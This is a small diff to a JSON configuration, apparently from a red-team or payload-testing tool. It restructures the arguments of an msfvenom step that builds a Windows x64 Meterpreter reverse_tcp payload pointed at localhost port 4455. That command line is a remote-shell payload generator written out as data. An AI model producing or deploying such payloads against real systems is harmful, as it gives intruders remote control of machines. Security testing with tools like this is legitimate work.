@@ -115,7 +115,8 @@
             "module": "msfvenom",
             "args":
             {
-                "command_line": "-p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4455 -f raw -o 9-msfvenom.bin"
+                "command_line": "-p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4455 -f raw",
+                "output": "9-msfvenom.bin"
             },
             "input_buffer": false,
             "return_buffer": false
